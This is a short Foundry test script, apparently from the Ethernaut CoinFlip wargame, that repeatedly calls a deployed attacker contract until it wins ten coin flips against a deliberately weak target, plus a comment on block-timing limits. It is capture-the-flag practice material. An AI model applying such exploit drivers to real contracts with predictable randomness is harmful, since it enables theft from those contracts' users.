// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "contracts/3Coinflip.sol";
import "contracts/attackers/3CoinFlipAttack.sol";

contract CoinFlipAttackerTest is Test {
    address public targetContractAddress = 0x201EE3C5270d9BA470457efaD5b584Af744331Fc;
    CoinFlip public targetContract = CoinFlip(payable(targetContractAddress));
    CoinFlipAttack public attackerContract = CoinFlipAttack(0xFe8C49004864470eD905bc1947fdFEeBF939939a);

    function test() public {
        uint256 currentWins = 0;
        vm.startBroadcast();
        while (currentWins < 10) {
            currentWins = attackerContract.guessFlip(targetContractAddress);
            // vm.mine(1);
        }
        vm.stopBroadcast();
    }
}
// This challenge requires calling a function multiple times over at least 10 blocks
// This cannot be accomplished due to the nature of foundry as a while loop that runs
// until the block changes would run out of memory. Instead we deploy our own attacking
// contract and call it using hardhat as that has access to wait()
